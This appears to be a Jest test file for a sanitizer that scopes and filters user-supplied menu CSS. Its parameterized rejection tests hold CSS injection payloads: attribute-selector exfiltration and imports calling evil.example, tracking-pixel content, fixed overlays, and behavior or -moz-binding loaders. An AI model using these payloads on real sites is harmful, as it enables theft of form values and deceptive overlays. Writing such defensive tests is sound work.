import { InvalidMenuCssError, MENU_CSS_SCOPE_CLASS, sanitizeMenuCss } from "./menu-css-sanitizer";

describe("sanitizeMenuCss", () => {
  it("returns empty string for blank input", () => {
    expect(sanitizeMenuCss("")).toBe("");
    expect(sanitizeMenuCss("   ")).toBe("");
  });

  it("scopes every selector under the menu-custom class", () => {
    const out = sanitizeMenuCss(".product-card { color: red; } .header, .title { font-weight: 700; }");
    expect(out).toBe(
      `.${MENU_CSS_SCOPE_CLASS} .product-card{color:red}` +
        `.${MENU_CSS_SCOPE_CLASS} .header,.${MENU_CSS_SCOPE_CLASS} .title{font-weight:700}`,
    );
  });

  it("scopes bare element/attribute selectors so they can't escape the container", () => {
    const out = sanitizeMenuCss("body { color: red } input[value] { color: blue }");
    expect(out).toContain(`.${MENU_CSS_SCOPE_CLASS} body`);
    expect(out).toContain(`.${MENU_CSS_SCOPE_CLASS} input[value]`);
  });

  it("allows a reasonable set of layout/typography/color properties", () => {
    const out = sanitizeMenuCss(
      ".card { color: #111; background-color: #fff; border-radius: 12px; padding: 8px 12px; font-weight: 600; box-shadow: 0 1px 2px rgba(0,0,0,.1); }",
    );
    expect(out).toContain("border-radius:12px");
    expect(out).toContain("box-shadow:0 1px 2px rgba(0,0,0,.1)");
  });

  it.each([
    ["input[value^=\"1\"] { background: url(https://evil.example/log?1) }", "url"],
    ["input[value^=\"1\"] { background: URL(https://evil.example/log?1) }", "url"],
    [".x { background: url('https://evil.example/pixel.gif') }", "url"],
    ["@import url('https://evil.example/x.css');", "@-rules"],
    ["@font-face { font-family: x; src: url(https://evil.example/f.woff2); }", "@-rules"],
    [".overlay { position: fixed; top: 0; left: 0; }", "position"],
    [".overlay { position: sticky; }", "position"],
    [".overlay { POSITION: FIXED; }", "position"],
    [".overlay { z-index: 99999; }", "z-index"],
    [".x::before { content: url(https://evil.example/track.gif); }", "content"],
    [".x::before { content: \"steal me\"; }", "content"],
    [".x { behavior: url(evil.htc); }", "not allowed"],
    [".x { -moz-binding: url(evil.xml); }", "not allowed"],
  ])("rejects a real attack payload: %s", (payload, expectedReason) => {
    expect(() => sanitizeMenuCss(payload)).toThrow(InvalidMenuCssError);
    try {
      sanitizeMenuCss(payload);
      throw new Error("expected sanitizeMenuCss to throw");
    } catch (error) {
      expect(error).toBeInstanceOf(InvalidMenuCssError);
      expect((error as Error).message.toLowerCase()).toContain(expectedReason.toLowerCase());
    }
  });

  it("rejects unknown properties (deny by default, not a blocklist)", () => {
    expect(() => sanitizeMenuCss(".x { animation: spin 1s; }")).toThrow(InvalidMenuCssError);
    expect(() => sanitizeMenuCss(".x { filter: blur(4px); }")).toThrow(InvalidMenuCssError);
  });

  it("rejects malformed/unparseable CSS instead of best-effort recovering it", () => {
    expect(() => sanitizeMenuCss(".a { color: red;;; @importbogus")).toThrow(InvalidMenuCssError);
  });

  it("rejects input over the length cap", () => {
    const huge = `.x { color: red; } /* ${"a".repeat(21_000)} */`;
    expect(() => sanitizeMenuCss(huge)).toThrow(InvalidMenuCssError);
  });

  it("allows position: relative/absolute/static", () => {
    expect(() => sanitizeMenuCss(".x { position: relative; }")).not.toThrow();
    expect(() => sanitizeMenuCss(".y { position: absolute; }")).not.toThrow();
    expect(() => sanitizeMenuCss(".z { position: static; }")).not.toThrow();
  });
});
